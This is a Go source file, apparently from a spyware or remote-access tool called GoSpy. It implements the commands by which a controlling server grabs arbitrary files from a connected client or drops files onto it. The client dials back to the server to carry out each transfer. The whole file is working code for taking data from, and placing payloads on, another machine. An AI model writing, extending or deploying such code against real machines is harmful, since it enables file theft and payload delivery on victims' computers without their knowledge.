package commands

import (
	"errors"
	"fmt"
	"github.com/psidex/GoSpy/internal/comms"
	"github.com/psidex/GoSpy/internal/server/conman"
	"os"
)

func FileCmdReply(cmdCon comms.Connection, localFilePath string, dropFile bool) (err error) {
	if !dropFile {
		// We are sending file so let the server know if the file exists or not.
		if _, statErr := os.Stat(localFilePath); statErr == nil {
			if err = cmdCon.SendString("ok"); err != nil {
				return err
			}
		} else {
			return cmdCon.SendString("err")
		}
	}

	// The new connection is created first so if the client or server has a file r/w err the connection is closed which
	// signifies to the other process to not continue with the command. (same with GrabFileSend).
	conn, err := cmdCon.DialRemote()
	if err != nil {
		return err
	}
	defer conn.Close()

	if err = comms.TransferFile(conn, localFilePath, !dropFile); err != nil {
		return err
	}
	return nil
}

// FileCmdSend combines the grab-file and drop-file commands in one function, set the drop bool to determine which one
// you want to do.
func FileCmdSend(man conman.ConMan, srcPath, dstPath string, dropFile bool) (err error) {
	if dropFile {
		// We are dropping to the client so make sure the file exists here.
		if _, err = os.Stat(srcPath); err != nil {
			return err
		}
	}

	var cmdText string
	var localPath string // The path that will be passed to TransferFile.
	if dropFile {
		cmdText = fmt.Sprintf("drop-file %s", dstPath)
		localPath = srcPath
	} else {
		cmdText = fmt.Sprintf("grab-file %s", srcPath)
		localPath = dstPath
	}

	if err = man.CmdCon.SendString(cmdText); err != nil {
		return err
	}

	if !dropFile {
		// We are grabbing from the client so make sure the file on the client exists.
		if clientMsg, err := man.CmdCon.RecvString(); err != nil {
			return err
		} else if clientMsg == "err" {
			return errors.New("file does not exist on client")
		}
	}

	conn := man.AcceptSuccessful()
	defer conn.Close()

	if err = comms.TransferFile(conn, localPath, dropFile); comms.IsNetworkError(err) {
		fmt.Printf("Error with file drop connection: %s\n", err.Error())
		return nil
	} else if err == nil {
		fmt.Println("File drop complete")
	}
	return err
}
